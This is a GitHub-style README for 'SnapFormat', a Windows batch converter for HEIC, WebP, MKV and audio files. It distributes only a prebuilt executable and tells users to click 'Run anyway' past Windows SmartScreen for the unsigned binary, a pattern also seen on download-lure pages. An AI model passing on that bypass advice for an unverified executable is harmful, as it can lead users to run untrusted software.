<p align="center">
  <img src="https://i.postimg.cc/C5Jj86mB/banner.png" alt="SnapFormat Batch Media Converter — Offline HEIC, WebP, MKV & Audio Converter" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Batch%20Media%20Converter-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-snapformat--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# SnapFormat Batch Media Converter — Offline HEIC, WebP, MKV & Audio Converter

**Windows refusing to open iPhone .HEIC photos or .WebP downloads? Need to remux 20 OBS .MKV recordings to .MP4 without re-encoding or convert .FLAC/.WAV tracks to .MP3? Convert entire folders offline in one drag-and-drop batch.**

SnapFormat Batch Media Converter combines image, video, and audio format conversion in one offline Windows utility: **supporting lossless MKV-to-MP4 container remuxing (zero quality loss in under 1 second), bulk HEIC/WebP/AVIF to JPG/PNG conversion, and batch audio extraction**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) users** who want fast, private bulk media conversion without paying for Windows Store HEIC codecs or uploading files to ad-heavy websites.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| iPhone `.HEIC` or `.WebP` images won't open in older apps | Windows lacks built-in HEIC codec or apps reject WebP containers | Batch convert `.HEIC` / `.WebP` / `.AVIF` to `.JPG` or `.PNG` |
| Video editor rejects OBS `.MKV` screen recordings | Premiere / Resolve / Vegas prefer `.MP4` containers over `.MKV` | Use instant lossless MKV → MP4 remuxing without re-encoding |
| Need MP3 audio tracks extracted from video recordings | Manual audio extraction requires complex timeline exports | Drop `.MP4` / `.MKV` videos and export `320 kbps` MP3 or WAV |
| Online converters cap batch size to 5 files at a time | Web converters throttle free users and inject ads | Process 500+ local files simultaneously using all CPU cores |

## Download for Windows

[**Download SnapFormat.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/SnapFormat.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `SnapFormat.exe`? (Key features)

- Converts `.HEIC`, `.HEIF`, `.WebP`, `.AVIF`, `.BMP`, and `.TIFF` images to `.JPG` or `.PNG` in bulk.
- Remuxes `.MKV` and `.MOV` videos to `.MP4` without re-encoding (preserving 100% original video quality).
- Converts `.FLAC`, `.WAV`, `.OGG`, `.M4A`, and video audio tracks to `.MP3` (`192`/`320 kbps`) or `.WAV`.
- Runs multi-threaded locally with zero file count limits or internet connection required.

### Sample Output

```text
[SnapFormat] Processing 48 queued files (Multi-threaded local worker)...
[OK]   IMG_4012.HEIC  -> IMG_4012.jpg (Quality: 95% | 2.1 MB)
[OK]   banner_art.webp -> banner_art.png (Lossless | 840 KB)
[OK]   OBS_2026-11.mkv -> OBS_2026-11.mp4 (Stream-copy remux in 0.4s)
[OK]   Batch Complete  : 48/48 files converted in 4.2 seconds
```

The release ZIP is named `SnapFormat.zip`; the Windows executable inside is named `SnapFormat.exe`.

1. Close SnapFormat before updating or replacing executable files.
2. Click **Download SnapFormat.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `SnapFormat.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with read/write access to your media folders.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `SnapFormat.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Paid Microsoft Store HEVC/HEIC codec prompts on Windows

Converting iPhone `.HEIC` photos locally to standard `.JPG` or `.PNG` avoids codec errors across every Windows app.

### Slow re-encoding when all you need is `.MKV` → `.MP4`

Lossless stream-copy remuxing swaps the container wrapper from `.MKV` to `.MP4` in milliseconds without touching video frames.

### Browser `.WebP` saves breaking Photoshop or PowerPoint imports

Bulk-converting downloaded `.WebP` images to `.PNG` makes them compatible with every editor.

### Privacy risks of uploading personal photos and videos online

Everything runs locally on your drive with zero cloud transfers.

## Default folders and configuration paths

SnapFormat processes files from any local folder and saves converted outputs to a clean subfolder:

```text
%USERPROFILE%\Pictures\Converted\
```

Typical directory layout:

```text
SourceFolder\
├── IMG_001.HEIC
├── capture.mkv
└── Converted\
    ├── IMG_001.jpg
    └── capture.mp4
```

Original files are never overwritten; converted files are written into `Converted\` by default.

## Quick start guide

Follow these steps to get started:

1. **Extract `SnapFormat.zip` to any folder on your PC.** No installation or admin rights required.
2. **Drag files or folders into `SnapFormat.exe`.** Automatically detects image, video, and audio extensions.
3. **Select your target format (`JPG`, `PNG`, `MP4 Remux`, `MP3`, `WAV`).** Adjust JPG quality (85–100%) or MP3 bitrate if needed.
4. **Click **Convert All**.** Watch per-file progress complete across all CPU threads.
5. **Open the `Converted` output folder.** Verify your converted images, videos, or audio tracks.

### Data safety note

Source files are kept intact in their original directory.

## What the status summary shows

SnapFormat reports **input format, conversion mode (remux vs. transcode), output size, and elapsed time** for every batch.

## FAQ

**Does MKV to MP4 remuxing reduce video quality?**

No. Stream-copy remuxing copies the exact H.264/HEVC video and audio streams into an MP4 container with zero quality loss.

**Can I convert iPhone HEIC photos without buying the Windows Store extension?**

Yes—SnapFormat decodes `.HEIC` and `.HEIF` natively offline.

**Is there any limit on how many files I can convert at once?**

No. You can drop hundreds of files or entire folders in a single batch.

## Useful reading

- [libheif / Open-Source Image Codecs](https://github.com/strukturag/libheif)

## More Windows Desktop Utilities

- [ClipShrink-DiscordCompressor](../ClipShrink-DiscordCompressor) — Compress gameplay clips to exact 10 MB / 50 MB Discord limits
- [WhisperDesk-OfflineTranscriber](../WhisperDesk-OfflineTranscriber) — Local offline speech-to-text & SRT subtitle generator
- [CleanCut-OfflineBgRemover](../CleanCut-OfflineBgRemover) — Offline batch image background remover & PNG cutout tool
- [ExifScrub-PhotoMetadataCleaner](../ExifScrub-PhotoMetadataCleaner) — Strip GPS, EXIF & camera metadata from photos offline

*Independent open-source desktop utility for Windows.*
